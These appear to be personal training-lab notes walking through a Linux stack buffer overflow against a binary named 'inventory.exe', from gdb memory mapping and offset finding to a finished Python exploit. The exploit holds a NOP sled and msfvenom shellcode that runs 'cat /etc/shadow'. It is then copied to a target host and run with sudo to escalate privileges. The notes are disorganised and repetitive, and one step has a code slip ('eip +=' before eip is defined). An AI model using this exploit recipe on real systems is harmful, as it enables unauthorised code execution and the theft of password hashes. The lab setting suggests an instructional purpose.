# LINUX BUFFER OVERFLOW 

##static analysis- view code
check the file type
```
file <executable>               
```
look at the actual code 
```
strings <>    
```
check permissions
```
ls -lisa <executable> 
```


## behavioral- as intended

make it executable
```
chmod +x <executable>  
```
run the command
```
./<executable>     
```

## Dynamic analysis- not as intended

1. command substitution (used for passing parameters)
```
$(echo "1234") or `echo "1234"
```
   1.5 simulate user input into a file
```
         <file> <<<$(echo "1234")
```

## step 1

```
   linops > gdb
   gdb > shell
   
   linops (shell) > env - gdb inventory.exe
   
   gdb > unset env LINES
   
   gdb > unset env COLUMNS
   
   gdb > run #press ctrl c immediately
   
   gdb > info proc map
```
if you dont see the heap in the output, that means you arent far along the executable yet, you can use the START command, and run a step command, and info proc map until you see the heap show up in the proc map. 
instead of run use start and a step command in gdb to go to the next area in memory. and run info proc map again after. repeeat this until you see the heap.
```
step
```

   # this is where the find command comes in, first from below the heap (start) and the last from the stack (last)
```
   find /b (first after the heap),(LAST OF THE STACK),0xff,0xe4
```
# this gets is our eip address that we convert to LITTLE ENDIAN, which goes into our script as the EIP VALUE

converting to little endian   
```
  0xf7de3b59   turns into   \x59\x3b\xde\xf7"
```


than we did 'quit' to get back to our shell

than we did 'exit' to get back to our initial gdb shell

# gdp-peda
```
unset env LINES
```
```
unset env COLUMNS
```
```   
file inventory.exe 
```
before running this next command insure your script contains what is listed below
```
run <<<$(python linbuff.py)
```
## at this point linbuff should contain the following, insure you comment out the same values as me throught ALL steps  
```
#!/usr/bin/env python

offset = "A" * 500

#eip = "\x59\x3b\xde\xf7"



print(offset)
```             
# Building our script 
 one you insure you have enough charecters to overwrite the eip go and get a string from wiremask with the same amount of charecters. 

 than copy and paste that string into your script in place of the ' "A" * 500 '

 these are the updates to script, comment out old values
```
#offset = "A" * 500 
offset = " this is where you put that long ass string we found but it would take up too much space" 
```
## now we want to rerun the script from our gdb-peda session 
```
run <<<$(python linbuff.py)
```
## now copy the hex value of the EIP and put that into the Register value section of wiremask. wiremask will now tell you the exect value to make your offset of "A"s

  now make the change to our script, comment out old values and make sure you do "+=" on the second offset
```
#offset = "A" * 500 
#offset = " this is where you put that long ass string we found but it would take up too much space"
offset = "A" *76
offset += "BBBB"
```
## now we want to rerun the script from our gdb-peda session
   
   we are looking to see that the "BBBB" is next to our EIP this will insure that we have the correct offset
```
run <<<$(python linbuff.py)
```
## now that we are sure our offset is correct, we can put our actual EIP that we discovered from our find comand earlier. Make sure you turned it into little endian 
```
#offset = "A" * 500 
#offset = " this is where you put that long ass string we found but it would take up too much space"
offset = "A" *76
#offset += "BBBB"
eip += "\x59\x3b\xde\xf7"  
```

# next is the msfvenom command
from a different linops term  
```
msfvenom -p linux/x86/exec CMD="cat /etc/shadow" -b "\x00\xfe\x20\x0a\xff" -f python
```
this gets us our buf values, INCLUDE THE EMPTY BUF VALUE, AND THE QUOTE AT THE END
   
paste the buf into the script

add your NOP sled to the script 

# below should be matching with your final script, PRINT ORDER MATTERS 
  ```
#!/usr/bin/env python




#offset = "A" * 500

#offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"

offset = "A" * 76
#offset += "BBBB"

eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 76

buf =  b""
buf += b"\xdb\xcb\xba\x9a\x67\x1b\x7a\xd9\x74\x24\xf4\x58"
buf += b"\x2b\xc9\xb1\x0d\x31\x50\x1a\x03\x50\x1a\x83\xc0"
buf += b"\x04\xe2\x6f\x0d\x10\x22\x16\x80\x40\xba\x05\x46"
buf += b"\x04\xdd\x3d\xa7\x65\x4a\xbd\xdf\xa6\xe8\xd4\x71"
buf += b"\x30\x0f\x74\x66\x52\xd0\x78\x76\x30\xb1\x0c\x56"
buf += b"\x99\x54\x98\xf5\xca\xe5\x08\x9b\x70\x65\xbf\x5b"
buf += b"\x2e\x2a\xb6\xbd\x1d\x4c"

print(offset+eip+nop+buf)


```

   # try the final script on your own box to insure the script is working  and than we will move on to putting the script on our target 
```
./inventory.exe <<<$(python ~/Desktop/linbuff.py)
```

   # navigate to .111 through your tunnels 
   
   # either scp or copy and paste your script onto our target 

   # !!we have to find the EIP of this device, so we are going to run the gdb commands on our target

```
gdb > shell
   
   linops (shell) > env - gdb /.hidden/inventory.exe
   
   gdb > unset env LINES
   
   gdb > unset env COLUMNS
   
   gdb > run #press ctrl c immediately
   
   gdb > info proc map
```
# this is where we do the find command again( almost there )  
```
find /b (first after the heap),(LAST OF THE STACK),0xff,0xe4
```
# this gets is our eip address that we convert to LITTLE ENDIAN, which goes into our script as the EIP VALUE

converting to little endian and place it where the other eip was 
```
  0xf7de3b59   turns into   \x59\x3b\xde\xf7"
```
 put this new eip in place of the old one in your script 

   # run the script on the target device 
```
    ./inventory.exe <<<$(python ~/Desktop/linbuff.py)
```
  
   
   # use sudo !! to run the script as an elevated user
```
sudo !!
```   
   
   
       
  2.dgb;; file  #shows if you have an exeutible chosen
  3.file inventory.exe  #sets the executible to our file 
  4. unset env LINES
  5. unset env COLUMNS
  6. info functions 
  7. (disass) pdisass main <look for GetUserInput or GetTheGoods>
  8. pdisass GetTheGoods <or any other intresting file name you found that gets input>
  9. run <<<$(python script.py)   

     script.py

     #!/usr/bin/env python

     offset = "A" * 100

     print(offset)
```

## step 3
```
1.insure that the EIP was written over and shows 0x41414141
2.go to wiremask and put the length equal to the amount of "A"'s you sent in the offset
3. adjust your script to contin the string discovered from the wiremask
    script.py
    #!/usr/bin/env python
    offset = "STRING OPTAINED FROM WIREMASK"
    print(offset)

4. in gdb run <<<$(python script.py)
5. copy the Hex value of the EIP into the offset field of the wiremask website
6. that will give you the correct offset of "A"'s to put into your script
7. set the EIP value to "BBBB" to insure the offset is correct
8. add the eip to the print command

      script.py
     #!/usr/bin/env python
     offset = "A" * 76
     eip = "BBBB" 
     print(offset+eip)
```
## step 4 
```
1. add the nop and comment out the eip on your script insuring to add it to the print command aswell. 

         script.py
     #!/usr/bin/env python
     offset = "A" * 76
     #eip = "" 
     nop = "\x90" * 15
     print(offset+nop)
2. linops;;; msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
3. copy over the bufs including the empty one and add it to your script
4. insure you add buf to your print 
```
         script.py
     #!/usr/bin/env python
     offset = "A" * 76
     #eip = "" 
     nop = "\x90" * 15
     #buf =  b""
     #buf += b"\xda\xd4\xba\x4b\xd4\xeb\xb5\xd9\x74\x24\xf4\x5e"
     #buf += b"\x29\xc9\xb1\x11\x31\x56\x17\x83\xc6\x04\x03\x1d"
     #buf += b"\xc7\x09\x40\xcb\xec\x95\x32\x59\x95\x4d\x68\x3e"
     #buf += b"\xd0\x69\x1a\xef\x91\x1d\xdb\x87\x7a\xbc\xb2\x39"
     #buf += b"\x0c\xa3\x17\x2d\x13\x24\x98\xad\x4f\x45\xec\x8d"
     #buf += b"\xa0\xab\x7f\xa8\xdd\xc1\x1a\x46\x0d\x08\x93\xc3"
     #buf += b"\x23\x2d\x28\x6e\xa7\xbf\xab\x04\x09\x30\x50\x86"
     #buf += b"\x55\xe7\xcb\xcf\xb7\xca\x6c"
     print(offset+nop+buf)
```
```
## step 5 
```
      from gdb
2. info proc map
3. copy the first addreess after the heap
4. copy the last address before the stack
5. use those adresses in the following find command
  find /b <first address after heap>,<end of stack>,0xff,0xe4 
6. copy first 5 addresses and convert them to little endian
          0x f7 de 3b 59 > "\x59\3b\de\f7"
7. set eip = "\x59\x3b\xde\xf7" in our script

```
## step 6 
```
msfvenmon -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python in your shell
```

